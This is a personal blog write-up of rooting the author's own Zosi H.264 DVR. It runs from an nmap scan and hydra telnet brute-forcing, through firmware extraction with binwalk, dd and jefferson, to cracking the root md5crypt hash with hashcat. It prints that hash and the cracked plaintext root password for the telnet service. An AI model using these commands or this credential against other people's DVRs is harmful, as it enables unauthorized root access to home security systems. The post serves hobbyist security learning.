# Hacking the Zosi Camera DVR

![](files/Pasted%20image%2020230617191751.png)
https://www.amazon.com/ZOSI-channels-Security-Detection-Recorder/dp/B00KX00DVI/

**TL/DR**

I never really felt like the owner of my Zosi H.264 DVR security system since I didn't have the credentials to login to its listening telnet port.  I attempted to bruteforce access over the network using hydra but with no luck.  Next I downloaded the DVR's firmware, extracted the file system, and found root's encrypted password.  I spent four days trying to crack the password and finally succeeded using rockyou and hashcat's dive rule on the 4th day.  Using the cracked password I was able to telnet into the DVR as root.  Now that I have root access, I'm a proud pwner of the Zosi H.264 DVR!

**The Journey**

My dad purchased a Zosi H.264 720p DVR camera system as a holiday gift for me some time ago.  He was gracious enough to come over and assist me with installing the cameras and fishing the power and data lines through the attic to my network rack.  It was a long dusty day of crawling through my home's attic but we were successful and I had a new security camera system to catch all the happenings around my home.

The manufacturer offers a desktop and a mobile application to remotely view various cameras.  I wasn't too keen on remotely accessing the video footage at any time so I opted not use the applications in favor of connecting a monitor to the DVR and viewing the closed feed whenever needed.  

Out of curiosity I connected the DVR on my network and ran an `nmap` scan.  The scan quickly discovered port 23 telnet was open.  Telnet is an unencrypted remote access service which could grant me a terminal on the DVR if I had the credentials.

```bash
daniel@daniel-desktop:~$ nmap -A 192.168.3.138 -p-
Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-17 18:55 PDT
Nmap scan report for 192.168.3.138
Host is up (0.0093s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
23/tcp open  telnet  security DVR telnetd (many brands)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.66 seconds
```

My enthusiasm was quickly displaced when I discovered that no credentials were provided with the documentation or otherwise published on the internet.  Naturally, I was inclined to find the credentials!

Sending an ICMP `ping` to the DVR revealed a time to live (ttl) of 63 hops suggesting the DVR is running a Unix/Linux operating system.  Assuming so would probably have been a safe guess regardless, but with this information I would know that the root account would likely be a valid telnet user target.

```bash
daniel@daniel-desktop:~$ ping 192.168.3.138 -c 1
PING 192.168.3.138 (192.168.3.138) 56(84) bytes of data.
64 bytes from 192.168.3.138: icmp_seq=1 ttl=63 time=1.24 ms

--- 192.168.3.138 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.235/1.235/1.235/0.000 ms
```

Thinking that the password may be very simple, I attempted guessing a few commonly used passwords.  My guessed passwords were "blank", root, admin, zosi, and a handful of others before giving up and deciding to automate the effort using `hydra` network bruteforcing tool.

```bash
daniel@daniel-desktop:~$ telnet 192.168.3.138
Trying 192.168.3.138...
Connected to 192.168.3.138.
Escape character is '^]'.

(none) login: root
Password: 
Login incorrect
(none) login: root
Password: 
Login incorrect
(none) login: root
Password: 
Login incorrect
Connection closed by foreign host.
```

`Hydra` is great for network authentication bruteforcing attacks but requires a password list.  Because network attacks can be somewhat slow I went for a shorter list `xato-net-10-million-passwords-100.txt` from Daniel Miessler's awesome [SecLists repository](https://github.com/danielmiessler/SecLists).

```bash
daniel@daniel-desktop:/$ hydra -l root -P /tmp/xato-net-10-million-passwords-100.txt 192.168.3.138 telnet
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-17 19:11:04
[WARNING] telnet is by its nature unreliable to analyze, if possible better choose FTP, SSH, etc. if available
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:1/p:100), ~7 tries per task
[DATA] attacking telnet://192.168.3.138:23/
1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-17 19:11:31
```

Zero hits, another bust!  It was time for a firmware hacking approach.  John Hammond recently published a `Getting Started in Firmware Analysis & IoT Reverse Engineering` [YouTube Video](https://www.youtube.com/watch?v=zs86OYea8Wk) where he demonstrates sourcing and extracting an IoT's filesystem from firmware to grab encrypted passwords from the shadow file for cracking later.  Drawing inspiration for John's video, I first needed to find the firmware that was running on the DVR.  To find the version of the firmware I used the DVR's User Guide on the Amazon listing page for the device. Section 9 of the user guide proudly display's instructions on how to upgrade the DVR and an example firmware version `rootfs-hi3520d`.

![](files/Pasted%20image%2020230617194127.png)
https://m.media-amazon.com/images/I/C1WFUEYWqzS.pdf

A search on Zosi's Support site for the rootfs-hi3520d file yielded a support article and download link.  I downloaded the firmware and ran the `file` command which displayed a hirootfs file system.  

```bash
daniel@daniel-desktop:/tmp$ file rootfs-hi3520d 
rootfs-hi3520d: u-boot legacy uImage, hirootfs, Linux/ARM, Filesystem Image (any type) (Not compressed), 11648276 bytes, Tue Dec 22 03:26:43 2015, Load Address: 0x00000000, Entry Point: 0x00000000, Header CRC: 0x35576305, Data CRC: 0xA18D7037
```

Next I unsuccessfully tried extracting the file system from the firmware file using `binwalk`.  Nonetheless, `binwalk` identified a header in the first 64 bytes and a jffs2 file system in the remaining of the byte range.

```bash
daniel@daniel-desktop:/tmp$ binwalk -e rootfs-hi3520d 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             uImage header, header size: 64 bytes, header CRC: 0x35576305, created: 2015-12-22 03:26:43, image size: 11648276 bytes, Data Address: 0x0, Entry Point: 0x0, data CRC: 0xA18D7037, OS: Linux, CPU: ARM, image type: Filesystem Image, compression type: none, image name: "hirootfs"
64            0x40            JFFS2 filesystem, little endian
```

Even though `binwalk` didn't extract the file system, I could use `dd` to specifically carve out the byte range desired.  Running `dd` did the trick as I extracted just the jffs2 section of the firmware file into a file named `system.jffs2` and confirmed file type of jffs2 using the `file` command.

```bash
daniel@daniel-desktop:/tmp$ dd if=rootfs-hi3520d of=system.jffs2 skip=64 bs=1
11648276+0 records in
11648276+0 records out
11648276 bytes (12 MB, 11 MiB) copied, 14.4728 s, 805 kB/s
daniel@daniel-desktop:/tmp$ 
daniel@daniel-desktop:/tmp$ 
daniel@daniel-desktop:/tmp$ file system.jffs2 
system.jffs2: Linux jffs2 filesystem data little endian
```

With the files system extracted, I needed to view the system files by mounting the system.  I could achieve this using the [jefferson](https://github.com/sviehb/jefferson) tool.  After installing `jefferson` and its dependencies, I ran the tool on the system.jffs2 file which mounted all files into a jffs2-root directory in the current folder.

Jefferson installation:
```bash
sudo apt install python3-pip git python3-lzo
sudo pip3 install cstruct
git clone https://github.com/sviehb/jefferson
cd jefferson/
python3 setup.py install
```

Mounting the jffs2:
```bash
daniel@daniel-desktop:/tmp$ sudo jefferson system.jffs2
dumping fs to /tmp/jffs2-root (endianness: <)
Jffs2_raw_inode count: 1201
Jffs2_raw_dirent count: 1201
writing S_ISDIR bin
writing S_ISDIR boot                                  
writing S_ISDIR dev
writing S_ISDIR etc
[...snip...]
writing S_ISLNK usr/sbin/telnetd
writing S_ISLNK usr/sbin/udhcpd
writing S_ISDIR usr/share/udhcpc
writing S_ISREG usr/share/udhcpc/default.script
writing S_ISDIR var/run
writing S_ISREG var/run/utmp
----------
```

Now that the jffs2 file system was mounted in jffs2-root directory, I  began exploring if this firmware had a shadow or passwd file that could contain the telnet user and encrypted password.  Running `ls` gave me an overview of the file system.

```bash
daniel@daniel-desktop:/tmp/jffs2-root$ ls -la
total 108
drwxr-xr-x 21 root root  4096 Jun 17 20:32 .
drwxrwxrwt 26 root root 20480 Jun 17 20:32 ..
drwxr-xr-x  2 root root  4096 Jun 17 20:32 bin
drwxr-xr-x  2 root root  4096 Jun 17 20:32 boot
drwxr-xr-x  2 root root  4096 Jun 17 20:32 dev
drwxr-xr-x  6 root root  4096 Jun 17 20:32 etc
drwxr-xr-x  2 root root  4096 Jun 17 20:32 hitoe
drwxr-xr-x  2 root root  4096 Jun 17 20:32 home
lrwxrwxrwx  1 root root     9 Jun 17 20:32 init -> sbin/init
drwxr-xr-x  3 root root  4096 Jun 17 20:32 lib
lrwxrwxrwx  1 root root    11 Jun 17 20:32 linuxrc -> bin/busybox
drwxr-xr-x  2 root root  4096 Jun 17 20:32 lost+found
-rwxrwxrwx  1 root root   431 Jun 17 20:32 mknod_console
drwxr-xr-x  4 root root  4096 Jun 17 20:32 mnt
drwxr-xr-x  2 root root  4096 Jun 17 20:32 nfsroot
drwxr-xr-x  2 root root  4096 Jun 17 20:32 opt
drwxr-xr-x  2 root root  4096 Jun 17 20:32 proc
drwxr-xr-x  2 root root  4096 Jun 17 20:32 root
drwxr-xr-x  2 root root  4096 Jun 17 20:32 sbin
drwxr-xr-x  2 root root  4096 Jun 17 20:32 share
drwxr-xr-x  2 root root  4096 Jun 17 20:32 sys
drwxr-xr-x  2 root root  4096 Jun 17 20:32 tmp
drwxr-xr-x  6 root root  4096 Jun 17 20:32 usr
drwxr-xr-x  3 root root  4096 Jun 17 20:32 var
```

And listing files in the file system's etc folder reveals passwd file.  I used `cat` to dump the file contents which displayed the only user on the system as root and the encrypted password `$1$Zvj.IvRb$7g3anRUwEV0tiP//JNqAh/`!  Usually a shadow file would contain the encrypted password, but I'm not complaining.

```bash
daniel@daniel-desktop:/tmp/jffs2-root$ cat etc/passwd
root:$1$Zvj.IvRb$7g3anRUwEV0tiP//JNqAh/:0:0::/root:/bin/sh
```

I explored the rest of the file system for other secrets but it didn't turn up anything meaningful.  With the encrypted password in hand, I fired up my local cracking box which isn't anything more than a physical consumer grade computer with an RTX 3060 graphics card.  I started with a bruteforce attack using `hashcat` configured to try every combination of digits, uppercase, lowercase, and special characters.  

```bash
hashcat -a 3 -m 500 -O -w 3 -1?l?u?d?s ?1?1?1 zosi.passwd
```

After a full day of running, `hashcat` incremented to 7 character attempts that were estimated to take 30 days of runtime.  Because 30 days was too long, I re-calibrated the tool to bruteforce only common special characters.  This new calibration of 7 characters with a limited special character set would consume 3 full days of running.  

```bash
hashcat -m 500 zosi.passwd -a 3 -1 '!@#$%/.' -2?u?l?d ?2?2?2?2?2?2?2?2?2?2 -i -w 3 -O --increment-min=7
```

After 3 long days of  password cracking 7 characters, all combinations were exhausted and 8 characters were going to take another 30 days.  30 days definitely exceeded my interest in this project so I decided to turn to a `hashcat` wordlist approach using rockyou.txt with the dive ruleset.  The rockyou file contains about 14 million passwords from a data breach back in 2009.  14 million passwords might sound like a lot but it is grossly insufficient and only takes a few minutes to try every password in the list.  But you can extend that list by using hashcat's dive ruleset which mutates each password in the list with hundreds of rules like adding a couple digits to the end of the password or changing the letter "s" to a dollar sign.  Rockyou with the dive rule brings the total attempts from 14 million to about 1.5 trillion and would demand a full day of runtime to complete.  I fired it off and went to bed.  

```bash
hashcat -m 500 zosi.passwd wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule -w 3 -O
```

The next morning I checked the status of the rockyou+dive ruleset and bingo, password cracked!!

```bash

$1$Zvj.IvRb$7g3anRUwEV0tiP//JNqAh/:asj1234asj    
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: $1$Zvj.IvRb$7g3anRUwEV0tiP//JNqAh/
Time.Started.....: Sat Jun 17 20:53:56 2023 (1 hour, 17 mins)
Time.Estimated...: Sat Jun 17 22:11:49 2023 (0 secs)
Guess.Base.......: File (wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/dive.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 10086.7 kH/s (83.04ms) @ Accel:64 Loops:500 Thr:1024 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 47823846768/1421327633024 (3.36%)
Rejected.........: 647626096/47823846768 (1.35%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:25708-25709 Iteration:500-1000
Candidates.#1....: 1231234456 -> dus1234hleepapp
Hardware.Mon.#1..: Temp: 71c Fan: 69% Util:100% Core:1920MHz Mem:7300MHz Bus:16
```

It was finally time to find out if all this effort has been worth it by attempting to telnet into the DVR with the cracked password of the root user.  I launched `telnet` from my desktop, entered the username and password, and I got a "Welcome to HiLinux" message.  I was in and for the first time I felt like I truly pwned this DVR!  

![](files/Pasted%20image%2020230617205626.png)

Thank you for reading through this journey with me.  I hope you found some inspiration and learned something new.  On to the next one!




